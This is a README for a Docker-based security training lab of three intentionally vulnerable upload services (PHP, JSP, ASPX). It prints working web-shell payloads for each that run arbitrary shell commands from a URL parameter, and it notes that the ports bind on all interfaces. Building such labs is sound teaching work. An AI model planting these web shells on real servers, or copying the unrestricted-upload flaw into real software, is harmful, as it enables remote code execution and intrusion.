# Lab Viper Upload RCE

Three intentionally vulnerable upload labs for local security training:

- PHP on Apache: http://127.0.0.1:8081
- JSP on Tomcat: http://127.0.0.1:8082
- ASPX on Mono/XSP: http://127.0.0.1:8083

The compose file binds these ports on `0.0.0.0`, so they are also reachable from other machines using the Docker host IP, for example `http://<host-ip>:8081`.

Each service accepts any uploaded filename and writes it into a web-served directory. Uploading a runtime-specific script extension can execute code inside that container.

Use the matching payload extension for each runtime:

- PHP lab: `.php`
- JSP lab: `.jsp`
- ASPX lab: `.aspx`

For example, uploading `exploit1.php` to the ASPX lab on port `8083` will not execute PHP; it will be served as a static file/download. Upload that payload to the PHP lab on port `8081`, or use an `.aspx` payload for port `8083`.

## Run

```powershell
docker compose up --build
```

Open each URL, upload a script for that runtime, then browse to the returned upload link.

## Local RCE Smoke Tests

PHP payload saved as `cmd.php`:

```php
<?php echo '<pre>'; system($_GET['cmd'] ?? 'id'); echo '</pre>'; ?>
```

JSP payload saved as `cmd.jsp`:

```jsp
<%@ page import="java.io.*" %>
<pre><%
String cmd = request.getParameter("cmd");
if (cmd == null) cmd = "id";
String[] shell = {"/bin/sh", "-c", cmd};
Process p = Runtime.getRuntime().exec(shell);
try (InputStream in = p.getInputStream()) {
    int c;
    while ((c = in.read()) != -1) out.print((char)c);
}
%></pre>
```

ASPX payload saved as `cmd.aspx`:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<pre><%
string cmd = Request.QueryString["cmd"] ?? "id";
ProcessStartInfo psi = new ProcessStartInfo("/bin/sh", "-c \"" + cmd.Replace("\"", "\\\"") + "\"");
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd()));
%></pre>
```

Example after uploading:

- http://127.0.0.1:8081/uploads/cmd.php?cmd=id
- http://127.0.0.1:8082/uploads/cmd.jsp?cmd=id
- http://127.0.0.1:8083/uploads/cmd.aspx?cmd=id

## Notes

These services intentionally allow remote code execution. Keep them on a private lab network and do not expose them to the public internet.
